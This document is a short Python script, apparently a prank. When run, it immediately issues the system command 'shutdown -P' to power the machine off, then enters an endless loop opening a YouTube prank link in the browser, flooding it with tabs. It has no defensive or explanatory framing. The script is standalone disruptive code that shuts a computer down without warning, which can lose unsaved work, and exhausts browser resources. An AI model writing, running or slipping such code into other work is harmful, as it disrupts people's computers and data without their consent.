import os
import webbrowser
import threading

def shutdown():
    os.system("shutdown -P")

shutdown()
while True:
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
